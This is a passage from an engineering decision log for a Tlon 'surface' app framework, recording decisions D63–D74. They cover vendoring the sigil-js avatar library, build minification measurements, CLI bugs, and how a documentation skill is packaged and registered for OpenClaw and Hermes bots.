  - **The core returns a STRING, not a structure.** v2 dropped v1's
    renderer split, so "pure core → SVG structure" is not on offer. The
    string is parsed into Preact vnodes with the already-vendored **htm**,
    which costs no new dependency and keeps the sigil out of
    `innerHTML` — markup assembly around a bundle-supplied ship name is
    precisely what not to do.
  - **Colors are token references handed straight to the library**
    (`var(--color-text-secondary)` on `var(--color-bg-secondary)`), which
    it substitutes into `fill`/`stroke` presentation attributes. Measured
    to resolve in chromium, firefox and webkit, both standalone and inside
    the real sandbox document. This buys a property the chart does not
    have: because the colors stay live custom-property references, a theme
    flip recolors an already-drawn sigil — the gap D58 recorded as "left
    alone" does not exist on this path.
  - **The library's pixel `width`/`height` are replaced with a real
    `viewBox`** (it emits a lowercase `viewbox`, which SVG ignores), so
    `.tsh-avatar`'s token owns the size and no pixel number is ever an
    author's to guess — the D58 rule again. A star's 2:1 drawing
    letterboxes rather than being squashed.
  - **An undrawable name degrades to initials, never throws.** sigil-js
    throws through `invariant` on anything that is not a galaxy, star or
    planet, and `ship` arrives from app state, so a bad one is ordinary
    input. A throw inside `render` would replace the whole app with the
    broken-state view. Note the library normalises leniently: `zod~~`
    draws ~zod's sigil, matching what the rest of the app does.
  - **Parsing is memoized under a fixed bound (128).** The key is
    app-supplied, so an unbounded cache would be an app-controlled
    allocation.
  - **`SHELL_VERSION` is unchanged.** A new optional prop is additive per
    plan §9; `<Avatar initials="…" />` renders exactly what it did, and
    `initials` merely widened from required to optional, so no existing
    call changes shape or behavior.

- **D63: the build now defines `process.env.NODE_ENV`, and the artifact
  check forbids `process.env` outright.** Vite's lib mode deliberately
  leaves the substitution to the consumer — but the consumer here is an
  iframe with no `process`, so an unreplaced read is a `ReferenceError`
  parked on a code path. Vendoring sigil-js put five of them in (its
  `invariant` guards), all on the not-a-point-name path, which is exactly
  the path an app reaches by accident. Found by grepping the built
  artifact, not by a failing test — which is why the assertion now lives in
  `check:determinism` alongside the no-zod one, where the next vendored
  dependency will trip it.

- **D64: minify is now worth flipping, and the numbers say so.** D32 left
  `minify: 'esbuild'` off while size did not matter. Measured on this
  branch (JS only, CSS is ~7.6 kB):

  |                                   | raw       | gzip     |
  | --------------------------------- | --------- | -------- |
  | before sigil, `minify: false`     | 506,407 B | 110.9 kB |
  | after sigil, `minify: false`      | 802,262 B | 129.1 kB |
  | before sigil, `minify: 'esbuild'` | 227,480 B | 79.0 kB  |
  | after sigil, `minify: 'esbuild'`  | 513,580 B | 96.5 kB  |

  Sigil adds **+295,855 B raw (+58%)**, and tree-shaking cannot touch it:
  the two symbol tables (208 kB detailed, 79 kB icon-grade) are indexed by
  a runtime-computed phoneme, so rollup keeps both even though the avatar
  only ever asks for the icon-grade one. Minifying returns the artifact to
  roughly its pre-sigil raw size (514 kB vs 506 kB) and _below_ its
  pre-sigil gzip (96.5 vs 110.9 kB). Recorded, not flipped: D32 called it
  a deliberate decision, and this is the evidence for making it, not the
  authority to make it.

- **D65: minify flipped on (supersedes D32's default).** Vendoring
  sigil-js grew the artifact 58% raw and it is embedded as a string
  constant in every client, so D32's "if embedding budgets care" became
  true. Measured:

  | build                      | raw         | gzip         |
  | -------------------------- | ----------- | ------------ |
  | unminified, pre-sigil      | 506,407     | 110.9 kB     |
  | unminified, post-sigil     | 802,262     | 129.1 kB     |
  | **minified + `keepNames`** | **528,343** | **102.6 kB** |

  Sigils land and the artifact still travels smaller than before them.

  **`keepNames: true`** costs ~14.7 kB raw over bare minification and is
  worth it. The sandbox is deliberately hard to inspect — no devtools on
  a native webview, no network — so a shell stack trace arriving over the
  bridge is frequently the only signal available, and names are what make
  it legible. That is the auditability the old "readable output"
  justification was actually reaching for; a whole unminified artifact
  was a costly proxy for it. The stale comment was replaced rather than
  left to mislead a future reader into flipping it back.

  Verified rather than reasoned: every artifact assertion is a string
  literal (`tsh-button`, `tsh-broken`, `tsh-avatar-sigil`, `ZodError`,
  `process.env`, `import(`) or a `window` property name
  (`__TLON_SURFACE_SHELL_VERSION`), neither of which esbuild mangles by
  default — and `check:all` passes in the new mode, determinism included.

  **A near-miss worth recording:** the first attempt put `keepNames`
  under `build.esbuildOptions`, which is not a Vite key. It was silently
  ignored and produced **byte-identical** output. Only measuring caught
  it — a config key that looks meaningful and does nothing is the same
  failure class as D45's dead-code-that-reads-like-protection, and it
  would have shipped a comment promising legible stack traces we did not
  have.

- **D66: skill location is `packages/tlon-skill/skills/surfaces/`, and it
  needs four registration changes nobody has made.** Plan §9 names the
  path; the deciding argument is coupling — the skill is inert without
  the `surface *` CLI verbs, which ship in `@tloncorp/tlon-skill`, so
  co-locating makes skill/CLI version skew impossible, keeps the docs
  beside the `templates/` CI renders, and means a Hermes deployment with
  the CLI but no plugin tree still gets it. `packages/openclaw/skills/`
  is where the repo puts _tool-less_ knowledge.

  **Discoverability is not automatic. Four gaps, all unaddressed:**
  1. `packages/tlon-skill/package.json` `files` omits `skills/` — the
     directory will not ship in the npm tarball.
  2. `scripts/release-package.ts` hard-fails unless `files` matches an
     exact required list, and stages only `SKILL.md` + `references/`.
  3. `packages/openclaw/openclaw.plugin.json` lists skills explicitly and
     needs `node_modules/@tloncorp/tlon-skill/skills/surfaces` — without
     it **no OpenClaw bot loads the skill at all**.
  4. Hermes registers skills one at a time by path
     (`packages/hermes-tlon-adapter/adapter.py`) and needs a third
     `register_skill` call plus a resolver.

  Written docs that ship nowhere are worth nothing; this is a blocking
  item for the authoring milestone, not a packaging detail.

- **D67: plan errors found while writing the doctrine.** Each verified
  against code, none silently smoothed over.

  - **`app.html` is wrong; the bundle is JavaScript.** Plan §9 and the
    SKILL draft both write `surface lint app.html spec.json`, but
    `buildSandboxDocument` injects `bundleSource` inside a `<script>` and
    `wrapBundleSource` wraps it in a function, so an `.html` file
    containing markup would not run. Both existing bundles are `.js`.
    The plan needs correcting, and the gate is being made
    extension-agnostic.
  - **§7 describes an escaping intermediate that does not exist.** It
    says the `$actor` segment is substituted "RFC 6901-escaped", but
    `resolveActorSegments` runs _after_ `parsePointer` has unescaped, so
    the plain ship goes into an already-unescaped segment and the state
    key is `~zod`. Same observable result, but the author-facing rule is
    position-dependent: hand-written path segments need `~0`, keys read
    back in `render` are plain. Verified at
    `packages/api/src/__tests__/surfaceJsonPointer.test.ts:244`.
  - **`duplicatesTolerated` is not in the schema.** The session-5 prompt
    introduces it as a gate feature, but `SurfaceActionSchema` declares
    only `ops` and `acceptStale` and `z.object` strips unknown keys — so
    it survives only in the **raw** persisted spec. A gate reading it off
    a validated spec would see `undefined` and fail every `append`
    action, including correctly-marked ones.
  - **`countdown` cannot work under the no-clock rule.** It is in the
    launch template set, but `render` may not read `Date`, so a countdown
    cannot tick or compute "3 days left" — only display a host-written
    target and host-written status. Either the template needs a host
    rollover cadence, or it waits for `$period` (§12).
  - **No app CSS reaches the sandbox**, so the poll fixture's
    `class="poll-option-label"` is inert — a class with no rule behind
    it. Worth removing when that fixture is promoted.

- **D68: `surface create` could never succeed — a tracked poke needs its
  subscriptions open.** Fixed in `createSurfaceDeps().authenticate`
  (`packages/tlon-skill/scripts/surface-runtime.ts`).

  `authenticate` called `ensureClient()` with **no** subscription apps, but
  `createChannel` is a **tracked** poke and a tracked poke's watcher is fed
  by the subscription stream. With nothing subscribed the watcher could
  never fire: the poke created the channel on the ship, and the tracker
  threw `TimeoutError` ~20s later. Every `surface create` therefore
  reported failure for work that had already landed — and D50's observation
  logic, which exists precisely to tell a real failure from a silent
  success, was never reached, because the tracker threw first.

  **The cost was not a retry.** D50 makes a channel name single-use forever,
  so each retry burned a name. Two real names are burned in
  `~zod/surface-seed`: `dash-pj14oqjp` and `dash-lc4k5q4w`.

  The fix is `ensureClient(['groups', 'channels'])`, matching the precedent
  at `packages/tlon-skill/scripts/groups.ts` — the same list for the same
  reason. `sendPost` and `updateChannel` are plain pokes, which is why
  publish and event were unaffected: the defect is exactly co-extensive
  with the tracked ones, which is also what makes it easy to miss.

  **Why it escaped the suite.** The surface command tests substitute a test
  double for `authenticate` (`scripts/surface-test-doubles.ts` — an empty
  async function), so the real subscription requirement is exercised by no
  test at all. The dep boundary that makes the command group testable is
  the same boundary that leaves its runtime assembly uncovered; every rule
  the commands enforce is tested, and the wiring that lets them run is not.

  **Follow-up: audit the remaining tracked pokes reachable from the
  `surface *` command group for the same gap.**
  `packages/api/src/client/channelsApi.ts` alone holds five `trackedPoke`
  call sites; `createChannel` is the one the surface path reaches today,
  and Session 6's `surface fork` reaches it again.

- **D69: `--preserve-state` discards the new `initialState`, and preview
  shows the opposite.** Verified in source. The publish behaviour is
  correct and does not change; the preview divergence is now labelled.

  `foldForMigration` (`scripts/commands/surface-publish.ts`) returns
  `published.initialState` **only** when there is no existing definition.
  When one exists it folds the channel's history against the **old** spec
  and snapshots that. So on any revision of a live channel, the new spec's
  `initialState` is dead on arrival. Preview does the opposite:
  `migrationSnapshotPost` (`scripts/surface-preview.ts`) stands in a
  snapshot of `spec.initialState`, because a `preserveState` spec folds to
  `migration-pending` with no snapshot and the populated cell would
  otherwise be empty for a reason that has nothing to do with the app.
  **Preview therefore renders the new `initialState` and production renders
  the carried state.**

  Three rulings, in order.

  **(a) Publish is right and does not change.** Preserving state means the
  carried state wins. Letting the new `initialState` overwrite it would
  make the flag mean something else, and would leave no way at all to say
  "keep the data".

  **(b) The preview divergence is labelled, not fixed by guessing.** §9
  claimed preview equals production "by construction, not by resemblance".
  That is true of **document assembly** — the same assembler, the same
  shell artifact, the same CSP, the same bridge protocol, pinned by the
  test that fails if the renderer stops using the shared function — and
  false of **state derivation**. For a `preserveState` spec the populated
  capture is knowingly optimistic: it shows the app running on the state
  the spec asks for, where production shows it running on the state the
  channel already had. Narrowed rather than withdrawn in §9 and in
  `RUBRIC.md`, because the assembly guarantee is the real one and is the
  one anything is pinned against.

  **(c) The authoring consequence is the most valuable part. Data that
  lives in state changes by host event, not by revision.** "Add a poll
  choice" is therefore **two** mechanisms: a spec revision for the handler
  and the declared action, and a host event for the choice itself. A bot
  that publishes a revision and reports "added" is wrong, and the user
  looks at an unchanged screen and concludes the bot is broken. Recorded in
  `PARADIGM.md` §13 and in `SKILL.md`'s revise step.

- **D70: preview cannot fold host events, so a host-is-the-clock app
  captures only its pre-rollover half.** `foldPopulatedState` folds
  **declared actions** only — there is no way to say "and then the host
  posted a rollover". For the workout tracker that means the chart card and
  the past-sessions card are empty in all twelve preview cells: everything
  a rollover produces is invisible to the reviewer, and those are exactly
  the elements preview exists to inspect. The tall fold-free phone cell was
  added (§9) so a chart below the fold appears in some capture; this is the
  same element missing for a different reason.

  **Ruled: do not build the fix now.** State the limitation where the
  scorer reads it (`RUBRIC.md`, with the other artifacts that are preview's
  and not the app's) and where the design is recorded (§9's preview
  paragraph), so nobody files "the chart is broken" against an app whose
  chart works.

  **Session 6 candidate: `--host-ops <file>`** — a file of host operations
  preview folds _after_ the actions, so a template can ship the rollover
  its own screenshots need. Session 6 adds seven more templates and several
  of them are host-dependent, so the gap widens before it narrows.

- **D71: the gate's computed-invoke rule is right; nothing taught the
  pattern that satisfies it.** Both promoted fixtures tripped
  `undeclared-action` on a computed `invoke(option.actionId)`.

  Iterating over state to build one button per item is the natural shape
  for a poll, and it disables the gate's only defence against a typo'd
  action id **for the whole bundle** — a computed argument cannot be
  cross-referenced against the spec at all, so the check degrades from
  "every id is declared" to "no id was checked". `PARADIGM.md` §2 already
  said a typo'd action id "quietly does nothing"; it never showed the shape
  that keeps ids literal while still rendering a list.

  **Ruled: the rule stands, the templates changed.** The pattern is a
  literal handler table keyed by item id — `const VOTE = { pizza: () =>
invoke('vote-pizza'), … }` — looked up per item, rendering a **disabled**
  control for an id with no entry rather than a live control that does
  nothing. Adding a choice is then two edits the gate keeps honest (an
  action in `spec.json`, a line in the table), and a missing one is visibly
  inert instead of quietly dead. Both promoted templates demonstrate it
  (`VOTE` in poll, `LOG` in workout-tracker) and both `NOTES.md` say why
  the argument is a literal.

  It goes into `PARADIGM.md` §2 **before** Session 6 writes seven more
  templates against it. Otherwise seven more generations reach for the
  computed form, and seven more get a warning with no remedy anywhere in
  the doctrine.

- **D72: the raw-vs-validated hazard generalizes past the gate (generalizes
  D67).** D67 recorded that `duplicatesTolerated` is not in
  `SurfaceActionSchema` and `z.object` strips unknown keys, so **the gate**
  must read it off the raw spec. That framing was too narrow: the same trap
  was hit a second time, in a different command.

  `surface publish`'s post-write observation compared
  `canonicalJson(read.spec)` — the **validated** view — against the raw
  object it had just written. Any gate-only marker was therefore present in
  what was written and absent from what was compared, so a landed write
  reported `publish-unconfirmed`. Net effect: every `append`-using app was
  unpublishable through the exact opt-out the gate **requires** and both
  `PARADIGM.md` and the gate's own violation message promise. Fixed in
  commit `5002b721ac` by comparing the verbatim cell, with a test pinning
  the round trip so a later "cleanup" to the validated view fails loudly.

  **The rule is not "the gate reads raw."** It is: **any comparison of a
  written spec against a read-back one must use the raw cell**, because the
  schema strips exactly the keys the gate depends on. Reading a _field_ off
  the validated spec stays correct; comparing _specs_ does not. §9's gate
  paragraph now states the general rule and names both instances rather
  than describing only the gate's.

  Two instances in two different commands is enough to suspect a third.
  **Follow-up: audit the remaining read-back comparisons.** Today's other
  writer observations compare `post.blob` as a string, which is already raw
  against raw; the live risk is Session 6's `surface fork`, which reads a
  source spec and republishes it — republishing the validated view would
  silently drop `duplicatesTolerated` from every forked `append` app, and
  the fork would fail its own gate on a bundle that passed at the source.

- **The step-9 jargon-denylist bullet closes with no additions.** Session
  5's step 5 said to extend the denylist "as template work suggests".
  Template work is now done: the workout tracker tripped the jargon rule on
  **"spec"**, which is already one of the six terms (`rollover`,
  `revision`, `invoke`, `spec`, `scratch`, `$actor`), and writing both
  templates surfaced no new jargon. **The denylist needs no additions** —
  recorded explicitly so the bullet closes rather than staying silently
  open. Step 9's companion requirement, that §9's gate paragraph be the
  union of the gate as designed and the gate as built, is likewise
  satisfied: **the gate did not change during template promotion — the
  templates did.**

### Found, flagged, not fixed (session 5, template promotion)

- **`surface publish` has no dev storage path.** Without an S3-compatible
  endpoint it dies at `storage-unavailable`, so the whole pipeline is
  unrunnable against a fakeship — the one environment where it is cheap to
  run. The seed already faces this problem and solved it: it ships a local
  bundle server (`packages/shared/seed/bundleServer.ts`) precisely because
  provisioning a bucket is an out-of-repo human step, and the client does
  not special-case it. Publish has no equivalent. Session 5 worked around
  it with a ~70-line throwaway stub that lives in the session scratchpad,
  not in the repo, and will be lost. **Ruled:** either the CLI grows a
  documented dev-storage story or the plan's provisioning list says plainly
  that the loop is unrunnable locally without one — the note is added to
  the provisioning list now, and promoting a real dev-storage stub is a
  Session 6 candidate.

- **Preview's synthetic crew was three galaxies** (`~zod`, `~ten`,
  `~mug`). Measured rather than assumed: at the `detail: 'none'` grade the
  avatar primitive uses, sigil-js draws each galaxy as **exactly one
  featureless glyph** — `~zod` a `<circle>`, `~ten` a `<rect>`, `~mug` a
  `<path>` — against a planet's four. Every crew list in every capture was
  therefore three near-identical marks. (An earlier write-up of this
  finding claimed `~zod` and `~ten` emitted _no_ glyph at all and rendered
  as blank swatches; that came from counting only `<path>` elements and
  missing the circle and the rect. The conclusion is unchanged, the
  severity was overstated.) A reviewer scoring `RUBRIC.md`'s
  readability check could reasonably file "the avatars are broken" against
  an app whose avatars are fine. **Fixed narrowly:** `PREVIEW_ACTORS` is
  now `['~zod', '~ten', '~palfun-foslup']`, so at least one capture shows
  the four-glyph sigil most real members have. Two galaxies remain on
  purpose — a galaxy is a legitimate member and the crew should not be
  uniform — and the residual stands regardless: **synthetic preview actors
  are not real group members and their sigils are not a quality signal.**
  Stated in `RUBRIC.md` so it is scored that way.

- **A running rube web server cannot resolve
  `@tloncorp/surface-shell/sandbox` after the lockfile changes under it**,
  and shows a vite overlay where the app should be. A freshly started
  server re-optimizes its dependencies and works. Not a code defect — a
  trap that reads exactly like "the app is broken", costing a debugging
  cycle to whoever hits it next. Worth a line wherever the seed and dev-loop
  instructions live (`docs/tlon-apps/surface-channels-seed.md`).

- **The shell's own poll fixture still carries the inert
  `class="poll-option-label"`** that D67 flagged (no app CSS reaches the
  sandbox, so the class has no rule behind it). Discharged for the promoted
  template; `packages/surface-shell/fixtures/poll/` was deliberately left
  untouched, because it is the shell's own test fixture and its job is to
  exercise the shell, not to model authoring style.

### Session 5 addendum: shipping the skill (D66 closure)

- **D73: the compiled CLI could never find its own templates.**
  `templatesRoot()` resolved the catalogue from `path.resolve(__dirname,
  '..')`, under a comment asserting "the compiled binary keeps the same
  layout beside it." It does not. `bun build --compile` bakes `__dirname`
  into the binary as a **string literal** — verified by `strings` on
  `dist/tlon-run`, which contains the build machine's
  `.../packages/tlon-skill/scripts`, and by running the binary from an
  unrelated cwd, where it still printed the build machine's path as the
  template root. On a published build that path is the CI runner's
  checkout and does not exist on the user's machine.

  It is also structurally unfixable from inside the binary: the binary
  ships in the **platform** package (`@tloncorp/tlon-skill-<target>`,
  which contains only `tlon` and a `package.json`), while `skills/` ships
  in the **root wrapper** package. Nothing reachable from the binary
  points at the wrapper.

  **Fixed in `bin/tlon.js`**, which is the one component that knows: it is
  plain uncompiled JS, so its `__dirname` is real at runtime. It now sets
  `TLON_SURFACE_TEMPLATES_DIR` from its own location when the directory
  exists and no explicit override is present. Verified against a staged
  install layout (wrapper with `skills/`, platform package with only the
  binary): through the wrapper the catalogue resolves to the staged path;
  calling the same binary directly still reports the baked build-machine
  path, which is the mutation proving the wrapper is doing the work.

  This mattered more than an ordinary packaging bug because `SKILL.md`'s
  step 1 is "run `surface templates list`", and its step 1 rule is "adapt
  the closest template — never invent from scratch". A shipped skill whose
  first instruction returns nothing degrades every authoring run to the
  path the doctrine explicitly forbids.

  One correction to how this was first reported: the failure is **not**
  silent. `--json` returns `"installed": false` alongside the resolved
  `root`, and the human output says "No dashboard templates are installed
  (looked in X)". A caller can already distinguish a broken install from
  an empty one; the resolution was wrong, the reporting was not.

- **D74: under Hermes the skill is SKILL.md and nothing else.**
  `_serve_plugin_skill` (`tools/skills_tool.py`) ignores `skill_view`'s
  `file_path` argument for plugin skills and serves SKILL.md only, so a
  Hermes-hosted bot cannot reach `PARADIGM.md`, `PRIMITIVES.md`,
  `RUBRIC.md` or `templates/**` through the skill mechanism — it needs an
  ordinary file read. Pre-existing (the CLI skill's `references/` has the
  same problem) and not introduced by the registration work, but it means
  the two runtimes do not deliver the same skill: OpenClaw publishes the
  whole directory into the SDK's discovery tree, Hermes hands over one
  file. Compounding it, Hermes plugin skills are not listed in the system
  prompt's `<available_skills>` index at all — they are opt-in explicit
  loads — which is why registration also had to add a `surfaces_hint` to
  `platform_hint`, mirroring the product guide's.

  Consequence to carry into Session 6: the doctrine documents are
  load-bearing (`PARADIGM.md` is what stops a bot writing a non-idempotent
  `append` app), so on Hermes they must either be inlined into SKILL.md's
  preprocessing includes or reached by file read. Do not assume a
  registered skill means a readable skill.

- **Registering a skill takes six steps, not four.** D66 listed
  `package.json` `files`, `release-package.ts`, `openclaw.plugin.json`,
  and `adapter.py`. Two more were found by grepping an existing skill's
  name repo-wide: `plugin.yaml`'s `optional_env` (Hermes surfaces the
  resolution env vars at install/config time) and `test_tlon_tool.py`
  (which enumerates registered skills and asserts registration and hint
  fragment together). `release-utils.ts` was a third place inside step 2 —
  `assertRootTarball`'s allowlist would have rejected every `skills/**`
  entry as unexpected, so a fix touching only `release-package.ts` would
  have hard-failed the release. **The lesson is the method, not the
  count:** grep an existing instance's name across the whole repo before
  assuming a registration list is complete.

- **Deploy asymmetry worth knowing.** `bot-harness-deploy.yml`
  deliberately keeps `packages/tlon-skill` outside its path filter, so a
  content fix to the surfaces skill reaches production only via an npm
  publish and restart, not a develop merge — unlike the product guide.
  The `openclaw.plugin.json` manifest entry *is* on that filter, so
  merging it before publishing a tlon-skill version containing `skills/`
  logs a benign `plugin skill path not found` warning until the publish
  lands (the entry is skipped; the other two skills still load).
